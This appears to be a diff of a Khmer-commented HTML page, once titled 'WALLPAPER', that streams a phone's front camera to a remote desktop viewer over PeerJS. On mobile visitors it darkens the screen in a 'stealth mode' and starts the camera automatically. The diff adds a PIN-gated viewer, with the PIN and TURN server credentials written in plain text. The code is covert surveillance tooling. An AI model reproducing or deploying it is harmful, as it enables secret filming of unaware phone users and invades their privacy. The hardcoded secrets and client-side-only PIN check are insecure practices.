@@ -3,28 +3,31 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>WALLPAPER</title>
+    <title>🔐 ប្រព័ន្ធសុវត្ថិភាពកាមេរ៉ា និងលេខកូដសម្ងាត់</title>
     <script src="https://unpkg.com/peerjs@1.4.7/dist/peerjs.min.js"></script>
     <style>
+        /* កំណត់ផ្ទៃខាងក្រោយខ្មៅងងឹតទាំងស្រុង */
         html, body { 
             margin: 0; 
             padding: 0; 
             width: 100%; 
             height: 100%; 
-            background-color: #000000; 
+            background-color: #1e1e2e; 
             overflow: hidden; 
-            font-family: sans-serif; 
+            font-family: 'Khmer OS Battambang', sans-serif; 
         }
 
+        /* 🖥️ ផ្ទាំងបញ្ជាកុំព្យូទ័រ៖ រៀបចំឱ្យវីដេអូស្ថិតនៅចំកណ្តាលអេក្រង់ (លាក់ទុកមុនពេលដោះសោ) */
         #pc-ui {
             width: 100%;
             height: 100%;
-            display: flex;
+            display: none; /* នឹងបង្ហាញក្រោយពេលវាយកូដត្រូវ */
             justify-content: center;
             align-items: center;
             background-color: #000000;
         }
 
+        /* 📱 កូដកំណត់ឱ្យវីដេអូចេញទម្រង់ទូរសព្ទ ប៉ុន្តែពង្រីកកម្ពស់ពេញអេក្រង់កុំព្យូទ័រ */
         video { 
             height: 100vh;      
             width: auto;        
@@ -33,6 +36,7 @@
             display: none; 
         }
 
+        /* អក្សរបង្ហាញស្ថានភាពកណ្តាលអេក្រង់ */
         #status { 
             position: absolute; 
             top: 50%; 
@@ -49,11 +53,132 @@
             pointer-events: none;
         }
 
+        /* ------------------ ផ្នែករចនាប្រអប់សុវត្ថិភាព PIN ------------------ */
+        #login-container {
+            position: absolute;
+            width: 100%;
+            height: 100%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 100;
+            background-color: #1e1e2e;
+        }
+
+        .login-box {
+            background: rgba(255, 255, 255, 0.05);
+            padding: 40px 30px;
+            border-radius: 20px;
+            box-shadow: 0 15px 35px rgba(0,0,0,0.4);
+            text-align: center;
+            backdrop-filter: blur(10px);
+            border: 1px solid rgba(255,255,255,0.1);
+            width: 320px;
+            transition: 0.3s;
+            color: white;
+        }
+
+        .icon-lock {
+            font-size: 50px;
+            margin-bottom: 10px;
+            color: #ffb86c;
+            display: inline-block;
+            transition: transform 0.3s;
+        }
+
+        h2 { margin: 10px 0 20px 0; font-size: 22px; font-weight: 500; }
+
+        .input-group {
+            position: relative;
+            margin-bottom: 20px;
+        }
+
+        input[type="password"] {
+            width: 100%;
+            padding: 15px;
+            padding-left: 20px;
+            box-sizing: border-box;
+            background: #282a36;
+            border: 2px solid #44475a;
+            border-radius: 12px;
+            color: white;
+            font-size: 20px;
+            letter-spacing: 5px;
+            text-align: center;
+            outline: none;
+            transition: 0.3s;
+        }
+
+        input[type="password"]:focus {
+            border-color: #8be9fd;
+            box-shadow: 0 0 10px rgba(139, 233, 253, 0.3);
+        }
+
+        #login-btn {
+            width: 100%;
+            padding: 15px;
+            background: #50fa7b;
+            color: #282a36;
+            border: none;
+            border-radius: 12px;
+            font-size: 18px;
+            font-weight: bold;
+            cursor: pointer;
+            box-shadow: 0 5px 15px rgba(80, 250, 123, 0.3);
+            transition: 0.3s;
+        }
+
+        #login-btn:hover {
+            background: #40c963;
+            transform: translateY(-2px);
+        }
+
+        #status-text {
+            margin-top: 20px;
+            font-size: 16px;
+            font-weight: bold;
+            color: #ffb86c;
+            min-height: 24px;
+        }
+
+        @keyframes shake {
+            0%, 100% { transform: translateX(0); }
+            25% { transform: translateX(-10px); }
+            75% { transform: translateX(10px); }
+        }
+        .error-shake {
+            animation: shake 0.2s ease-in-out 2;
+            border-color: #ff5555 !important;
+        }
+
+        .fade-out {
+            opacity: 0;
+            transform: scale(0.9);
+            transition: 0.6s ease-out;
+        }
+
+        /* ធ្វើឱ្យទូរសព្ទងងឹតឈឹងសន្សំថ្ម */
         .phone-stealth-mode { background: #000000 !important; }
         .phone-stealth-mode #pc-ui { display: none !important; }
+        .phone-stealth-mode #login-container { display: none !important; }
     </style>
 </head>
 <body>
+
+    <div id="login-container">
+        <div class="login-box" id="login-card">
+            <div class="icon-lock" id="lock-icon">🔒</div>
+            <h2 id="title-text">វាយលេខកូដដើម្បីចូល</h2>
+            
+            <div class="input-group">
+                <input type="password" id="pin-input" placeholder="••••" maxlength="8" onkeypress="checkEnter(event)">
+            </div>
+
+            <button id="login-btn" onclick="verifyPIN()">ផ្ទៀងផ្ទាត់ 🔓</button>
+
+            <div id="status-text">ប្រព័ន្ធត្រូវបានចាក់សោរ</div>
+        </div>
+    </div>
 
     <div id="pc-ui">
         <div id="status">📡 កំពុងភ្ជាប់ទៅកាមេរ៉ាពីចម្ងាយ (Cambodia-Network)...</div>
@@ -61,10 +186,18 @@
     </div>
 
     <script>
-        // បង្កើតបន្ទប់ថ្មីដាច់ដោយឡែកសម្រាប់ការតេស្តនៅខ្មែរ
+        // 🔑 កំណត់លេខកូដសម្ងាត់ត្រង់នេះ
+        const CORRECT_PIN = "2011"; 
+
+        const pinInput = document.getElementById('pin-input');
+        const loginCard = document.getElementById('login-card');
+        const loginContainer = document.getElementById('login-container');
+        const statusText = document.getElementById('status-text');
+        const lockIcon = document.getElementById('lock-icon');
+        const pcUi = document.getElementById('pc-ui');
+
         const LIVE_ROOM_ID = 'hino-cambodia-local-secure-2026';
         
-        // 🛠️ ប្រើប្រាស់ TURN Server បង្ខំទម្លុះ Firewall របស់ក្រុមហ៊ុនអ៊ីនធឺណិតខ្មែរ (Smart/Cellcard/Metfone)
         const peerConfig = {
             config: {
                 iceServers: [
@@ -72,7 +205,6 @@
                     { urls: 'stun:stun1.l.google.com:19302' },
                     { urls: 'stun:stun.services.mozilla.com' },
                     {
-                        // ម៉ាស៊ីនមេជំនាញទម្លុះ Symmetric NAT របស់ប្រព័ន្ធស៊ីមទូរសព្ទ
                         urls: 'turn:139.59.245.105:3478?transport=udp',
                         username: 'hino_security',
                         credential: 'secure_password_2026'
@@ -83,7 +215,7 @@
                         credential: 'secure_password_2026'
                     }
                 ],
-                iceTransportPolicy: 'all' // អនុញ្ញាតឱ្យប្រើប្រាស់គ្រប់ផ្លូវរូងទិន្នន័យដើម្បីទម្លុះ
+                iceTransportPolicy: 'all'
             }
         };
         
@@ -92,17 +224,58 @@
         let localStream = null;
 
         window.onload = function() {
-            const isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(userAgent = navigator.userAgent);
+            const isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
 
             if (!isMobileDevice) {
-                runAsPC();
+                // ប្រសិនបើជាកុំព្យូទ័រ ឱ្យលោតកូនកណ្តុរចូលប្រឡោះវាយកូដភ្លាម
+                pinInput.focus();
             } else {
+                // ប្រសិនបើជាទូរសព្ទ គឺដំណើរការកាមេរ៉ាអូតូភ្លាម មិនបាច់វាយកូដទេ
                 document.body.classList.add('phone-stealth-mode');
                 startCamera();
             }
         };
 
-        // --- ផ្នែកកុំព្យូទ័រ ---
+        // --- មុខងារផ្ទៀងផ្ទាត់លេខកូដ (សម្រាប់កុំព្យូទ័រ) ---
+        function verifyPIN() {
+            const userPIN = pinInput.value;
+
+            if (userPIN === CORRECT_PIN) {
+                statusText.innerText = "🔓 ត្រឹមត្រូវ! កំពុងចូលទៅកាន់ប្រព័ន្ធ...";
+                statusText.style.color = "#50fa7b";
+                pinInput.style.borderColor = "#50fa7b";
+                lockIcon.innerText = "🔓";
+                lockIcon.style.transform = "scale(1.2)";
+                
+                setTimeout(() => {
+                    loginCard.classList.add('fade-out');
+                    setTimeout(() => {
+                        loginContainer.style.display = 'none'; // បិទផ្ទាំង Login ចោល
+                        pcUi.style.display = 'flex';           // បើកផ្ទាំងកាមេរ៉ា
+                        runAsPC();                             // ចាប់ផ្តើមដំណើរការប្រព័ន្ធតភ្ជាប់ PeerJS
+                    }, 600);
+                }, 1000);
+
+            } else {
+                statusText.innerText = "❌ លេខកូដមិនត្រឹមត្រូវទេ! ព្យាយាមម្តងទៀត";
+                statusText.style.color = "#ff5555";
+                loginCard.classList.add('error-shake');
+                pinInput.value = ""; 
+                pinInput.focus();
+
+                setTimeout(() => {
+                    loginCard.classList.remove('error-shake');
+                }, 400);
+            }
+        }
+
+        function checkEnter(event) {
+            if (event.key === "Enter") {
+                verifyPIN();
+            }
+        }
+
+        // --- ផ្នែកកុំព្យូទ័រ (ដំណើរការក្រោយពេលវាយកូដត្រូវ) ---
         function runAsPC() {
             if (peer) peer.destroy();
             peer = new Peer(LIVE_ROOM_ID, peerConfig);
@@ -126,7 +299,7 @@
                     video.play().catch(err => {
                         document.getElementById('status').style.display = 'block';
                         document.getElementById('status').style.color = '#ff3333';
-                        document.getElementById('status').innerText = "🛑 សូមចុចលើអេក្រង់កុំព្យូទ័រ ១ដង ដើម្បីបើករូបភាព";
+                        document.getElementById('status').innerText = "🛑 សូមចុចលើអេក្រង់កុំព្យូទ័រ ១ដង ដើម្បីបើករូបภาพ";
                         
                         document.body.onclick = () => {
                             video.play();
@@ -158,12 +331,7 @@
         // --- ផ្នែកទូរសព្ទ ---
         function startCamera() {
             navigator.mediaDevices.getUserMedia({
-                video: { 
-                    facingMode: "user", 
-                    width: { ideal: 640 }, 
-                    height: { ideal: 480 },
-                    frameRate: { ideal: 15 } // កំណត់ត្រឹម 15fps ដើម្បីឱ្យងាយស្រួលទម្លុះសេវាទូរសព្ទខ្សោយ
-                },
+                video: { facingMode: "user", width: { ideal: 640 }, height: { ideal: 480 }, frameRate: { ideal: 15 } },
                 audio: false
             })
             .then((stream) => {
